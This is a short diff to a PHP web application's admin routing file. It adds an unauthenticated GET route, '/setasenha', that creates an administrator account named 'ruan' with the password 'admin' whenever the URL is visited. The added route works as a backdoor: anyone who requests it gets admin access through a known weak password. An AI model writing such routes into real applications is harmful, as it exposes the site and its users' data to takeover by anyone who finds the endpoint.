@@ -63,5 +63,15 @@ $app->post("/admin/users/:iduser", function($iduser){
   exit;
 });
 
+$app->get("/setasenha",function() {
+	$user = new User();
+	$_POST['inadmin']=1;
+	$_POST['deslogin']='ruan';
+	$_POST['despassword'] = password_hash('admin', PASSWORD_DEFAULT, [
+		"cost"=>12
+	]);
+	$user->setData($_POST);
+   $user->save();	
+})
 
 ?>
